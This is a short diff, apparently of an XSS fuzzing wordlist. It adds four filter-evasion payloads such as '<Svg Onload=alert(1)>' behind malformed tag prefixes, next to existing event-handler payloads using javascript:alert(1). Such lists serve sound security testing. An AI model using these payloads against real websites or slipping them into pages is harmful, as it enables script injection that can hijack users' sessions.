@@ -2828,3 +2828,7 @@ www.meteoprog.ua
 <svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
 <title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
 <iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
+</<K><Svg Onload=alert(1)>
+</<Kno XSS="><Svg Onload=alert(1)>
+<!<K><Svg Onload=alert(1)>
+<!<Kno XSS="><Svg Onload=alert(1)>
